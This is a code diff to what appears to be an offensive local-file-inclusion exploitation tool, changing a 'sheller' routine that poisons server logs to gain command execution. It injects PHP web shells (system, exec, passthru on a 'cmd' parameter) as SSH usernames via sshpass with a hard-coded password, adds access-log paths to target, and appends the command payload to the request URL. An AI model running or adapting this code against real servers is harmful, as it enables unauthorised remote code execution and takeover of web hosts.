@@ -26,6 +26,7 @@ import base64
 import psutil
 import time
 import json
+import os
 
 import core.variables as vars
 
@@ -746,6 +747,7 @@ def sheller(
             "/var/log/apache/access.log",
             "/etc/httpd/logs/access_log",
             "/var/log/httpd/access_log",
+            "/var/log/httpd-access.log",
         ]
     elif technique == 3:
         files = [
@@ -949,9 +951,9 @@ def sheller(
                 tmp = tmp.split("@")[1]
             host = tmp.split("/")[0].split(":")[0]
             sshs = [
-                '<?php system("{}"); ?>@{}'.format(PAYLOAD, host),
-                '<?php exec("{}"); ?>@{}'.format(PAYLOAD, host),
-                '<?php passthru("{}"); ?>@{}'.format(PAYLOAD, host)
+                '<?php system($_GET["cmd"]); ?>@{}'.format(host),
+                '<?php exec($_GET["cmd"]); ?>@{}'.format(host),
+                '<?php passthru($_GET["cmd"]); ?>@{}'.format(host),
             ]
             ssht = [
                 "system():      ",
@@ -974,12 +976,31 @@ def sheller(
                             ["putty.exe", "-ssh", sshs[i]]
                         )
                     else:
-                        subprocess.run(["ssh", sshs[i]])
+                        with open(os.devnull, "w") as DEVNULL:
+                            subprocess.Popen(
+                                [
+                                    "sshpass",
+                                    "-p", "toor",
+                                    "ssh", sshs[i],
+                                ],
+                                stdout=DEVNULL,
+                                stderr=subprocess.STDOUT,
+                            )
                 except Exception as e:
                     show_status(gui, exception=e)
                     if app:
                         app.processEvents()
                 try:
+                    splitted = prep.url.split("#")
+                    if "?" in splitted[0]:
+                        splitted[0] += "&cmd={}".format(
+                            quote(PAYLOAD)
+                        )
+                    else:
+                        splitted[0] += "?cmd={}".format(
+                            quote(PAYLOAD)
+                        )
+                    prep.url = "#".join(part for part in splitted)
                     s.send(prep, timeout=timeout2)
                     show_status(gui)
                     if app:
